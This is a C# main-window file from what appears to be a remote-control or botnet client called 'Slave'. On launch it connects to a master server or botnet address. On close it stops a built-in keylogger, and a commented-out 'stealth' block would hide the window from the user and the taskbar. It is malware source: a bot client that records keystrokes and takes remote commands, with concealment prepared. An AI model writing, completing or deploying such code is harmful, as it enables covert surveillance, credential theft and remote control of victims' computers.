﻿using Slave.Commands.Core;
using Slave.Core;
using System.Threading.Tasks;
using System.Windows;

namespace Slave
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        SlaveManager manager { get; }

        public MainWindow()
        {
            InitializeComponent();

            manager = new SlaveManager();
            manager.networkManager = new SlaveNetworkManager();
            manager.commandsManager = new SlaveCommandsManager(manager.networkManager);

            // Start the processing in a new thread as a task
            Task mainTask;
            mainTask = Config.botnetAdress == null ?
                new Task(() => manager.StartWithMasterConnection()) :
                new Task(() => manager.StartWithBotnet());
            mainTask.Start();
        }

        /// <summary>
        /// When the application is exiting, stop the keylogger (uninstall keyboard hooks)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            manager.commandsManager.StopKeylogger();

            // stealth
            /*e.Cancel = true;
            this.ShowInTaskbar = false;
            this.Visibility = Visibility.Hidden;*/
        }
    }
}
